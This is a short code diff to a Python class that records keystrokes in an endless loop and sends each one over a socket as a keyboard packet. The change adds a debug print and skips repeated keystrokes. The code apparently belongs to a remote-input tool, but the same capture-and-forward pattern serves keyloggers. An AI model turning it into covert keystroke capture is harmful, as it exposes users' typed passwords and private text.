@@ -25,7 +25,12 @@ class KeyStrokes:
 
     @staticmethod
     def transmit(sock):
+        last_one = None
         while True:
             keystroke = KeyStrokes.record()
-            packet = Packet(PacketType.KEYBOARD, keystroke.encode())
-            SendPacket.send_packet(sock, packet)
+            if keystroke != last_one:
+                print(keystroke, last_one)
+                packet = Packet(PacketType.KEYBOARD, keystroke.encode())
+                SendPacket.send_packet(sock, packet)
+                last_one = keystroke
+
